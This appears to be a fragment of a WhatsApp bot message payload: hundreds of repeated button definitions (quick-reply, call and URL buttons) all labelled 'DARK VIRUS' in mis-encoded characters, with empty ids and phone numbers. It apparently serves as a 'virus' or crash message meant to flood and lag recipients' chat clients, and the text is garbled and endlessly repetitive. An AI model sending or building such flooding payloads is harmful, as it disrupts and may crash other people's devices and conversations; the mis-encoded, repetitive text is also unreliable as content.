{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
  { callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
   { callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
 { callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
 { callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
  { callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
   { callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
 { callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
 { callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
  { callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
   { callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
 { callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
 { callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
  { callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
